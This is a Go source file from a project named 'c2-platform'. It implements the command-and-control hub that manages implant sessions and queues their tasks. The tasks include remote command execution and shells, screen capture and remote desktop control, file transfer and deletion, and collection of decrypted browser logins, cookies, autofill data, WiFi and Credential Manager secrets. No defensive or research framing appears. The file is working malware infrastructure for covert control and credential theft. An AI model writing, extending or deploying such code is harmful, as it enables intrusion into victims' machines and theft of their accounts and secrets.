package session

import (
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"path/filepath"
	"sync"
	"time"

	"c2-platform/internal/protocol"
)

type Status string

const (
	StatusOnline Status = "online"
	StatusStale  Status = "stale"
	StatusDead   Status = "dead"
)

type TaskKind string

const (
	TaskExec    TaskKind = "exec"
	TaskFsLs    TaskKind = "fs.ls"
	TaskFsGet   TaskKind = "fs.get"
	TaskScreen  TaskKind = "screen"
	TaskDesktop TaskKind = "desktop"
	TaskShell   TaskKind = "shell"
	TaskFsPut   TaskKind = "fs.put"
	TaskFsDel   TaskKind = "fs.del"
	TaskFsMkdir TaskKind = "fs.mkdir"
	TaskFsRen   TaskKind = "fs.ren"
	TaskBrowser TaskKind = "browser"
	// TaskBrowserDeep streams decrypted browser logins, cookies and autofill
	// rows; TaskCreds collects non-browser secrets (WiFi, CredMan, clients).
	TaskBrowserDeep TaskKind = "browser.deep"
	TaskCreds       TaskKind = "creds"
)

const (
	// purgeAfter drops a session that has been silent this long; anything
	// shorter is only marked dead so the same connection can recover.
	purgeAfter = 10 * time.Minute
	// stallBatch / stallTask fail an in-flight task when the implant stops
	// talking for this long. Without it, one command the implant ignores (an
	// old payload has no browser.deep/creds handler) or a hung child process
	// occupies the session's single task slot forever and every later command
	// queues behind it.
	//
	// Collection tasks either stream rows or finish, so a minute of silence
	// means "not supported". Exec and shell may legitimately run for minutes,
	// and transfers keep sending chunks (which refresh LastSeen), so they get
	// the long budget instead.
	stallBatch   = 60 * time.Second
	stallTask    = 5 * time.Minute
	maxTaskBytes = 16 << 20
	// browsing stores (History) routinely exceed the task cap
	maxGetBytes = 128 << 20
	putChunk    = 48 * 1024
	maxPut      = 8 << 20
	maxPutChunk = 1 << 20
)

type Session struct {
	ID         string
	ListenerID string
	RemoteAddr string
	Reg        protocol.Register
	Remark     string
	LastSeen   time.Time
	Status     Status
	Busy       bool
	currentID  string
	send       func(protocol.Type, []byte) error
	queue      []queued
}

type queued struct {
	task *Task
}

type Task struct {
	ID        string
	SessionID string
	Kind      TaskKind
	Cmd       string
	Payload   []byte
	Output    []byte
	Done      bool
	Err       string
	Off       int64
	// Started is when the task was handed to the implant, Seen is the last time
	// a frame arrived for it. Heartbeats keep the *session* alive, so session
	// silence cannot tell whether a task is stuck; these two can.
	Started time.Time
	Seen    time.Time
}

type EventKind string

const (
	EventSessionUp    EventKind = "session.up"
	EventSessionStale EventKind = "session.stale"
	EventSessionDown  EventKind = "session.down"
	EventTaskOutput   EventKind = "task.output"
	EventTaskEnd      EventKind = "task.end"
	EventTaskError    EventKind = "task.error"
	EventListenerUp   EventKind = "listener.up"
	EventListenerDown EventKind = "listener.down"
	EventScreenFrame  EventKind = "screen.frame"
	EventFileList     EventKind = "file.list"
	EventShellData    EventKind = "shell.data"
	EventDeskFrame    EventKind = "desk.frame"
	EventXfer         EventKind = "xfer.progress"
)

type Event struct {
	Kind      EventKind `json:"kind"`
	SessionID string    `json:"session_id,omitempty"`
	TaskID    string    `json:"task_id,omitempty"`
	Data      string    `json:"data,omitempty"`
	Encoding  string    `json:"encoding,omitempty"`
	Mime      string    `json:"mime,omitempty"`
	Name      string    `json:"name,omitempty"`
	Error     string    `json:"error,omitempty"`
	Listener  string    `json:"listener_id,omitempty"`
}

type Hub struct {
	mu       sync.Mutex
	now      func() time.Time
	n        uint64
	sessions map[string]*Session
	tasks    map[string]*Task
	subs     []chan Event
	onDone   func(kind TaskKind, host string, rows []byte)
}

// SetOnDone registers a callback fired after a task completes. It runs on its
// own goroutine so slow consumers never block the hub lock.
func (h *Hub) SetOnDone(fn func(kind TaskKind, host string, rows []byte)) {
	h.mu.Lock()
	h.onDone = fn
	h.mu.Unlock()
}

func NewHub(now func() time.Time) *Hub {
	if now == nil {
		now = time.Now
	}
	return &Hub{
		now:      now,
		sessions: map[string]*Session{},
		tasks:    map[string]*Task{},
	}
}

func (h *Hub) nextID(prefix string) string {
	h.n++
	return prefix + itoa36(h.n)
}

func itoa36(n uint64) string {
	const digits = "0123456789abcdefghijklmnopqrstuvwxyz"
	if n == 0 {
		return "0"
	}
	var b [16]byte
	i := len(b)
	for n > 0 {
		i--
		b[i] = digits[n%36]
		n /= 36
	}
	return string(b[i:])
}

func (h *Hub) Attach(listenerID, remote string, reg protocol.Register, send func(protocol.Type, []byte) error) *Session {
	h.mu.Lock()
	defer h.mu.Unlock()
	s := &Session{
		ID:         h.nextID("s-"),
		ListenerID: listenerID,
		RemoteAddr: remote,
		Reg:        reg,
		LastSeen:   h.now(),
		Status:     StatusOnline,
		send:       send,
	}
	h.sessions[s.ID] = s
	h.emitLocked(Event{Kind: EventSessionUp, SessionID: s.ID})
	return s
}

func (h *Hub) Detach(id string) {
	h.mu.Lock()
	defer h.mu.Unlock()
	s, ok := h.sessions[id]
	if !ok {
		return
	}
	if s.Busy {
		for _, t := range h.tasks {
			if t.SessionID == id && !t.Done {
				t.Done = true
				t.Err = "session gone"
				h.emitLocked(Event{Kind: EventTaskError, SessionID: id, TaskID: t.ID, Error: t.Err})
			}
		}
	}
	delete(h.sessions, id)
	h.emitLocked(Event{Kind: EventSessionDown, SessionID: id})
}

func (h *Hub) Touch(id string) {
	h.mu.Lock()
	defer h.mu.Unlock()
	s, ok := h.sessions[id]
	if !ok {
		return
	}
	s.LastSeen = h.now()
	if s.Status != StatusOnline {
		s.Status = StatusOnline
		h.emitLocked(Event{Kind: EventSessionUp, SessionID: id})
	}
}

func (h *Hub) Tick() {
	h.mu.Lock()
	defer h.mu.Unlock()
	now := h.now()
	for id, s := range h.sessions {
		age := now.Sub(s.LastSeen)
		timeout := 30 * time.Second
		deadAfter := 90 * time.Second
		if s.Busy {
			timeout = 90 * time.Second
			deadAfter = 90 * time.Second
		}
		// A task that has gone quiet holds the only task slot on this session.
		// Fail it so the queue can move instead of stalling forever. The clock
		// is the task's own silence: heartbeats keep the session fresh even when
		// the implant silently ignores the command.
		if s.Busy {
			if t := h.inFlightLocked(s); t != nil && !t.Done {
				if budget, watched := stallFor(t.Kind); watched {
					since := t.Seen
					if since.IsZero() {
						since = t.Started
					}
					if idle := now.Sub(since); idle >= budget {
						t.Done = true
						t.Err = fmt.Sprintf("implant 无响应（%s 无数据），任务已中止；该指令可能不被此植入端支持", budget)
						s.Busy = false
						s.currentID = ""
						h.emitLocked(Event{Kind: EventTaskError, SessionID: id, TaskID: t.ID, Error: t.Err})
						h.kickLocked(s)
					}
				}
			}
		}

		switch {
		case age >= purgeAfter:
			// The socket never closed and never spoke again: forget it.
			delete(h.sessions, id)
			h.emitLocked(Event{Kind: EventSessionDown, SessionID: id})
		case age >= deadAfter && s.Status != StatusDead:
			// Mark, do not delete: the TCP connection may still be alive, and a
			// deleted session can never be revived by the frames that follow
			// (a long command, a stalled host, a temporary network hiccup).
			s.Status = StatusDead
			h.emitLocked(Event{Kind: EventSessionDown, SessionID: id})
		case age >= timeout && s.Status == StatusOnline:
			s.Status = StatusStale
			h.emitLocked(Event{Kind: EventSessionStale, SessionID: id})
		}
	}
}

var (
	ErrNoSession = errors.New("session not found")
	ErrOffline   = errors.New("session not online")
)

func (h *Hub) EnqueueExec(sessionID, cmd string) (string, error) {
	return h.Enqueue(sessionID, TaskExec, cmd)
}

func (h *Hub) Enqueue(sessionID string, kind TaskKind, arg string) (string, error) {
	h.mu.Lock()
	defer h.mu.Unlock()
	s, ok := h.sessions[sessionID]
	if !ok {
		return "", ErrNoSession
	}
	if s.Status != StatusOnline {
		return "", ErrOffline
	}
	t := &Task{
		ID:        h.nextID("t-"),
		SessionID: sessionID,
		Kind:      kind,
		Cmd:       arg,
	}
	h.tasks[t.ID] = t
	s.queue = append(s.queue, queued{task: t})
	h.kickLocked(s)
	return t.ID, nil
}

func cmdType(kind TaskKind) protocol.Type {
	switch kind {
	case TaskFsLs:
		return protocol.CmdFsLs
	case TaskFsGet:
		return protocol.CmdFsGet
	case TaskScreen:
		return protocol.CmdScreen
	case TaskDesktop:
		return protocol.CmdDeskOn
	case TaskShell:
		return protocol.CmdShellOn
	case TaskFsPut:
		return protocol.CmdFsPut
	case TaskFsDel:
		return protocol.CmdFsDel
	case TaskFsMkdir:
		return protocol.CmdFsMkdir
	case TaskFsRen:
		return protocol.CmdFsRen
	case TaskBrowser:
		return protocol.CmdBrowser
	case TaskBrowserDeep:
		return protocol.CmdBrowserDeep
	case TaskCreds:
		return protocol.CmdCreds
	default:
		return protocol.CmdExec
	}
}

func putSend(send func(protocol.Type, []byte) error, path string, data []byte, offset int64) {
	hdr := make([]byte, 3+len(path)+8)
	hdr[0] = 0
	binary.LittleEndian.PutUint16(hdr[1:3], uint16(len(path)))
	copy(hdr[3:], path)
	binary.LittleEndian.PutUint64(hdr[3+len(path):], uint64(offset))
	_ = send(protocol.CmdFsPut, hdr)
	for i := 0; i < len(data); i += putChunk {
		j := i + putChunk
		if j > len(data) {
			j = len(data)
		}
		chunk := make([]byte, 1+j-i)
		chunk[0] = 1
		copy(chunk[1:], data[i:j])
		_ = send(protocol.CmdFsPut, chunk)
	}
	_ = send(protocol.CmdFsPut, []byte{2})
}

// stallFor picks the silence budget for a task kind. Streaming kinds (an open
// shell, a desktop feed) are meant to stay quiet for a long time and are not
// watched at all.
func stallFor(kind TaskKind) (time.Duration, bool) {
	switch kind {
	case TaskShell, TaskDesktop:
		return 0, false
	case TaskBrowser, TaskBrowserDeep, TaskCreds:
		return stallBatch, true
	default:
		return stallTask, true
	}
}

func (h *Hub) kickLocked(s *Session) {
	if s.Busy || len(s.queue) == 0 || s.send == nil {
		return
	}
	q := s.queue[0]
	s.queue = s.queue[1:]
	s.Busy = true
	s.currentID = q.task.ID
	now := h.now()
	q.task.Started = now
	q.task.Seen = now
	if q.task.Kind == TaskFsPut {
		off := int64(0)
		if len(q.task.Payload) >= 8 {
			// offset stashed in first 8 bytes when using PutFileAt
		}
		_ = off
		putSend(s.send, q.task.Cmd, q.task.Payload, q.task.Off)
		return
	}
	body := q.task.Payload
	if body == nil {
		body = []byte(q.task.Cmd)
	}
	_ = s.send(cmdType(q.task.Kind), body)
}

func (h *Hub) SendInput(sessionID string, payload []byte) error {
	h.mu.Lock()
	defer h.mu.Unlock()
	s, ok := h.sessions[sessionID]
	if !ok {
		return ErrNoSession
	}
	if s.Status != StatusOnline || s.send == nil {
		return ErrOffline
	}
	return s.send(protocol.CmdInput, payload)
}

func (h *Hub) StopDesktop(sessionID string) error {
	h.mu.Lock()
	defer h.mu.Unlock()
	s, ok := h.sessions[sessionID]
	if !ok {
		return ErrNoSession
	}
	if s.send == nil {
		return ErrOffline
	}
	return s.send(protocol.CmdDeskOff, nil)
}

func (h *Hub) SendShell(sessionID string, payload []byte) error {
	h.mu.Lock()
	defer h.mu.Unlock()
	s, ok := h.sessions[sessionID]
	if !ok {
		return ErrNoSession
	}
	if s.Status != StatusOnline || s.send == nil {
		return ErrOffline
	}
	return s.send(protocol.CmdShellIn, payload)
}

func (h *Hub) StopShell(sessionID string) error {
	h.mu.Lock()
	defer h.mu.Unlock()
	s, ok := h.sessions[sessionID]
	if !ok {
		return ErrNoSession
	}
	if s.send == nil {
		return ErrOffline
	}
	return s.send(protocol.CmdShellOff, nil)
}

func (h *Hub) StartShell(sessionID string) error {
	h.mu.Lock()
	defer h.mu.Unlock()
	s, ok := h.sessions[sessionID]
	if !ok {
		return ErrNoSession
	}
	if s.Status != StatusOnline || s.send == nil {
		return ErrOffline
	}
	return s.send(protocol.CmdShellOn, nil)
}

func (h *Hub) StartDesktop(sessionID string, width, quality int) error {
	h.mu.Lock()
	defer h.mu.Unlock()
	s, ok := h.sessions[sessionID]
	if !ok {
		return ErrNoSession
	}
	if s.Status != StatusOnline || s.send == nil {
		return ErrOffline
	}
	if width < 0 {
		width = 1920
	}
	if width > 3840 {
		width = 3840
	}
	if quality < 40 {
		quality = 85
	}
	if quality > 95 {
		quality = 95
	}
	var b [4]byte
	binary.LittleEndian.PutUint16(b[0:2], uint16(width))
	binary.LittleEndian.PutUint16(b[2:4], uint16(quality))
	return s.send(protocol.CmdDeskOn, b[:])
}

func (h *Hub) PutFile(sessionID, path string, data []byte) (string, error) {
	if path == "" {
		return "", errors.New("path required")
	}
	if len(data) > maxPut {
		return "", errors.New("file too large")
	}
	h.mu.Lock()
	defer h.mu.Unlock()
	s, ok := h.sessions[sessionID]
	if !ok {
		return "", ErrNoSession
	}
	if s.Status != StatusOnline {
		return "", ErrOffline
	}
	t := &Task{ID: h.nextID("t-"), SessionID: sessionID, Kind: TaskFsPut, Cmd: path, Payload: data}
	h.tasks[t.ID] = t
	if s.Busy || s.send == nil {
		s.queue = append(s.queue, queued{task: t})
		return t.ID, nil
	}
	s.Busy = true
	s.currentID = t.ID
	putSend(s.send, path, data, 0)
	return t.ID, nil
}

func (h *Hub) EnqueueGet(sessionID, path string, offset, maxlen int64) (string, error) {
	h.mu.Lock()
	defer h.mu.Unlock()
	s, ok := h.sessions[sessionID]
	if !ok {
		return "", ErrNoSession
	}
	if s.Status != StatusOnline {
		return "", ErrOffline
	}
	t := &Task{
		ID:        h.nextID("t-"),
		SessionID: sessionID,
		Kind:      TaskFsGet,
		Cmd:       path,
		Payload:   protocol.EncodeGetArg(offset, maxlen, path),
		Off:       offset,
	}
	h.tasks[t.ID] = t
	s.queue = append(s.queue, queued{task: t})
	h.kickLocked(s)
	return t.ID, nil
}

func (h *Hub) PutFileAt(sessionID, path string, offset int64, data []byte) (string, error) {
	if path == "" {
		return "", errors.New("path required")
	}
	if len(data) > maxPutChunk {
		return "", errors.New("chunk too large")
	}
	h.mu.Lock()
	defer h.mu.Unlock()
	s, ok := h.sessions[sessionID]
	if !ok {
		return "", ErrNoSession
	}
	if s.Status != StatusOnline {
		return "", ErrOffline
	}
	t := &Task{ID: h.nextID("t-"), SessionID: sessionID, Kind: TaskFsPut, Cmd: path, Payload: data, Off: offset}
	h.tasks[t.ID] = t
	if s.Busy || s.send == nil {
		s.queue = append(s.queue, queued{task: t})
		return t.ID, nil
	}
	s.Busy = true
	s.currentID = t.ID
	putSend(s.send, path, data, offset)
	return t.ID, nil
}

func (h *Hub) Emit(ev Event) {
	h.mu.Lock()
	defer h.mu.Unlock()
	h.emitLocked(ev)
}

func (h *Hub) SetRemark(sessionID, remark string) error {
	h.mu.Lock()
	defer h.mu.Unlock()
	s, ok := h.sessions[sessionID]
	if !ok {
		return ErrNoSession
	}
	s.Remark = remark
	return nil
}

func (h *Hub) Quit(sessionID string) error {
	h.mu.Lock()
	defer h.mu.Unlock()
	s, ok := h.sessions[sessionID]
	if !ok {
		return ErrNoSession
	}
	if s.send == nil {
		return ErrOffline
	}
	return s.send(protocol.CmdQuit, nil)
}

func (h *Hub) OnFrame(sessionID string, f protocol.Frame) {
	h.mu.Lock()
	defer h.mu.Unlock()
	s, ok := h.sessions[sessionID]
	if !ok {
		return
	}
	s.LastSeen = h.now()
	switch f.Type {
	case protocol.CmdHeartbeat, protocol.CmdPing:
		if s.Status != StatusOnline {
			s.Status = StatusOnline
			h.emitLocked(Event{Kind: EventSessionUp, SessionID: sessionID})
		}
	case protocol.RspShell:
		if t := h.inFlightLocked(s); t != nil {
			t.Seen = h.now()
		}
		h.emitLocked(Event{Kind: EventShellData, SessionID: sessionID, Data: decodeOEM(f.Payload)})
	case protocol.RspShellEnd:
		// closing an interactive shell is not a task completion
		h.emitLocked(Event{Kind: EventShellData, SessionID: sessionID, Data: ""})
	case protocol.RspFrame:
		b64 := base64.StdEncoding.EncodeToString(f.Payload)
		t := h.inFlightLocked(s)
		if t != nil {
			t.Seen = h.now()
		}
		if t != nil && t.Kind == TaskScreen {
			t.Output = append([]byte(nil), f.Payload...)
			h.emitLocked(Event{Kind: EventScreenFrame, SessionID: sessionID, TaskID: t.ID, Data: b64, Encoding: "base64", Mime: "image/jpeg"})
		} else {
			h.emitLocked(Event{Kind: EventDeskFrame, SessionID: sessionID, Data: b64, Encoding: "base64", Mime: "image/jpeg"})
		}
	case protocol.RspData:
		t := h.inFlightLocked(s)
		if t == nil {
			return
		}
		t.Seen = h.now() // progress: keeps transfers and long commands off the stall guard
		switch t.Kind {
		case TaskDesktop:
			t.Output = append([]byte(nil), f.Payload...)
			h.emitLocked(Event{
				Kind:      EventScreenFrame,
				SessionID: sessionID,
				TaskID:    t.ID,
				Data:      base64.StdEncoding.EncodeToString(f.Payload),
				Encoding:  "base64",
				Mime:      "image/jpeg",
			})
		case TaskShell:
			h.emitLocked(Event{Kind: EventShellData, SessionID: sessionID, TaskID: t.ID, Data: decodeOEM(f.Payload)})
		case TaskScreen:
			if len(t.Output)+len(f.Payload) <= maxTaskBytes {
				t.Output = append(t.Output, f.Payload...)
			}
		case TaskFsGet:
			if len(t.Output) < maxGetBytes {
				t.Output = append(t.Output, f.Payload...)
			}
		case TaskFsLs:
			t.Output = append(t.Output, f.Payload...)
			h.emitLocked(Event{Kind: EventFileList, SessionID: sessionID, TaskID: t.ID, Data: decodeOEM(f.Payload)})
		default:
			t.Output = append(t.Output, f.Payload...)
			h.emitLocked(Event{Kind: EventTaskOutput, SessionID: sessionID, TaskID: t.ID, Data: decodeOEM(f.Payload)})
		}
	case protocol.RspErr:
		t := h.inFlightLocked(s)
		if t == nil {
			return
		}
		t.Err = string(f.Payload)
		t.Done = true
		s.Busy = false
		s.currentID = ""
		h.emitLocked(Event{Kind: EventTaskError, SessionID: sessionID, TaskID: t.ID, Error: t.Err})
		h.kickLocked(s)
	case protocol.RspEnd:
		t := h.inFlightLocked(s)
		if t == nil {
			return
		}
		t.Done = true
		s.Busy = false
		s.currentID = ""
		ev := Event{Kind: EventTaskEnd, SessionID: sessionID, TaskID: t.ID}
		switch t.Kind {
		case TaskScreen:
			ev.Kind = EventScreenFrame
			ev.Data = base64.StdEncoding.EncodeToString(t.Output)
			ev.Encoding = "base64"
			ev.Mime = "image/jpeg"
		case TaskFsLs:
			ev.Kind = EventFileList
			ev.Data = string(t.Output)
		case TaskFsGet:
			ev.Name = filepath.Base(t.Cmd)
			ev.Data = t.ID
		default:
			ev.Data = string(t.Output)
		}
		h.emitLocked(ev)
		if t.Done && h.onDone != nil {
			rows := append([]byte(nil), t.Output...)
			go h.onDone(t.Kind, s.Reg.Hostname, rows)
		}
		h.kickLocked(s)
	}
}

func (h *Hub) inFlightLocked(s *Session) *Task {
	if s.currentID == "" {
		return nil
	}
	return h.tasks[s.currentID]
}

func (h *Hub) GetTask(id string) *Task {
	h.mu.Lock()
	defer h.mu.Unlock()
	t := h.tasks[id]
	if t == nil {
		return nil
	}
	cp := *t
	cp.Output = append([]byte(nil), t.Output...)
	return &cp
}

func (h *Hub) Get(id string) *Session {
	h.mu.Lock()
	defer h.mu.Unlock()
	s := h.sessions[id]
	if s == nil {
		return nil
	}
	cp := *s
	cp.queue = nil
	cp.send = nil
	return &cp
}

func (h *Hub) List() []Session {
	h.mu.Lock()
	defer h.mu.Unlock()
	out := make([]Session, 0, len(h.sessions))
	for _, s := range h.sessions {
		cp := *s
		cp.queue = nil
		cp.send = nil
		out = append(out, cp)
	}
	return out
}

func (h *Hub) Subscribe() chan Event {
	h.mu.Lock()
	defer h.mu.Unlock()
	ch := make(chan Event, 256)
	h.subs = append(h.subs, ch)
	return ch
}

func (h *Hub) Unsubscribe(ch chan Event) {
	if ch == nil {
		return
	}
	h.mu.Lock()
	defer h.mu.Unlock()
	n := 0
	for _, s := range h.subs {
		if s != ch {
			h.subs[n] = s
			n++
		}
	}
	h.subs = h.subs[:n]
}

func (h *Hub) emitLocked(e Event) {
	for _, ch := range h.subs {
		select {
		case ch <- e:
		default:
		}
	}
}

func EncodeInput(kind byte, x, y int32, code uint16, down bool) []byte {
	b := make([]byte, 12)
	b[0] = kind
	binary.LittleEndian.PutUint32(b[1:5], uint32(x))
	binary.LittleEndian.PutUint32(b[5:9], uint32(y))
	binary.LittleEndian.PutUint16(b[9:11], code)
	if down {
		b[11] = 1
	}
	return b
}
